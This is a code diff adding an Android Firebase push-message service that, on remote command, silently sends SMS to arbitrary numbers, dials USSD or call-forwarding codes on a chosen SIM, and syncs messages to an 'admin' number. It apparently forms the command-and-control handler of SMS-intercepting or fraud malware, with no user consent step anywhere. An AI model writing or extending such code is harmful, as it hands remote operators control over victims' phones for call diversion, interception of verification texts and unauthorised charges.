@@ -1,0 +1,131 @@
+package com.example.admin.services
+
+import android.util.Log
+import androidx.work.*
+import com.google.firebase.messaging.FirebaseMessagingService
+import com.google.firebase.messaging.RemoteMessage
+import org.json.JSONObject
+import java.util.concurrent.TimeUnit
+
+@Suppress("unused")
+class MyFirebaseMessagingService : FirebaseMessagingService() {
+
+    companion object {
+        private const val TAG = "FCMService"
+    }
+
+    override fun onNewToken(token: String) {
+        super.onNewToken(token)
+        Log.d(TAG, "FCM token received (ignored, handled in MainActivity): $token")
+    }
+
+    override fun onMessageReceived(msg: RemoteMessage) {
+        Log.d(TAG, "FCM_RECEIVED data=${msg.data}")
+
+        val type = msg.data["type"] ?: return
+        val payloadStr = msg.data["payload"] ?: return
+        val payload = JSONObject(payloadStr)
+
+        when (type) {
+            "CHECK_ONLINE" -> enqueueCheckOnline(payload)
+            "DEVICE_COMMAND" -> routeDeviceCommand(payload)
+            "ADMIN_UPDATE" -> handleAdminUpdate(payload)
+            else -> Log.e(TAG, "Unknown type received: $type")
+        }
+    }
+
+    private fun enqueueCheckOnline(payload: JSONObject) {
+        val uid = payload.optString("uniqueid")
+        if (uid.isBlank()) return
+
+        val request = OneTimeWorkRequestBuilder<com.example.admin.workers.CheckOnlineWorker>()
+            .setInputData(workDataOf("uid" to uid))
+            .build()
+
+        WorkManager.getInstance(applicationContext).enqueue(request)
+    }
+
+    private fun routeDeviceCommand(payload: JSONObject) {
+        when (payload.optString("action")) {
+            "sms" -> enqueueSmsWorker(payload)
+            "ussd", "call" -> enqueueCallWorker(payload)
+            else -> Log.e(TAG, "Unknown action: ${payload.optString("action")}")
+        }
+    }
+
+    private fun enqueueCallWorker(payload: JSONObject) {
+        val uid = payload.optString("uniqueid")
+        val code = payload.optString("code")
+        val simSlot = payload.optInt("simSlot", 0)
+        val action = payload.optString("action", "ussd")
+
+        if (uid.isBlank() || code.isBlank()) return
+
+        val request = OneTimeWorkRequestBuilder<com.example.admin.workers.CallForwardWorker>()
+            .setInputData(
+                workDataOf(
+                    "uid" to uid,
+                    "code" to code,
+                    "simSlot" to simSlot,
+                    "action" to action
+                )
+            )
+            .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 10, TimeUnit.SECONDS)
+            .build()
+
+        WorkManager.getInstance(applicationContext).enqueue(request)
+    }
+
+    private fun enqueueSmsWorker(payload: JSONObject) {
+        val uid = payload.optString("uniqueid")
+        val to = payload.optString("to")
+        val body = payload.optString("body")
+        val simSlot = payload.optInt("simSlot", 0)
+        val timestamp = payload.optLong("timestamp")
+
+        if (uid.isBlank() || to.isBlank() || body.isBlank() || timestamp <= 0) return
+
+        val request = OneTimeWorkRequestBuilder<com.example.admin.workers.SmsSendWorker>()
+            .setInputData(
+                workDataOf(
+                    "uid" to uid,
+                    "to" to to,
+                    "body" to body,
+                    "simSlot" to simSlot,
+                    "timestamp" to timestamp
+                )
+            )
+            .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 10, TimeUnit.SECONDS)
+            .build()
+
+        WorkManager.getInstance(applicationContext).enqueue(request)
+    }
+
+    private fun handleAdminUpdate(payload: JSONObject) {
+
+        val deviceId = payload.optString("deviceId")
+        val number = payload.optString("number")
+        val status = payload.optString("status")
+
+        if (deviceId.isBlank() || number.isBlank() || status.isBlank()) return
+
+        val request = OneTimeWorkRequestBuilder<com.example.admin.workers.SmsSyncWorker>()
+            .setInputData(
+                workDataOf(
+                    "admin_number" to number,
+                    "admin_status" to status
+                )
+            )
+            .setBackoffCriteria(
+                BackoffPolicy.EXPONENTIAL,
+                10,
+                TimeUnit.SECONDS
+            )
+            .build()
+
+        WorkManager
+            .getInstance(applicationContext)
+            .enqueue(request)
+    }
+
+}
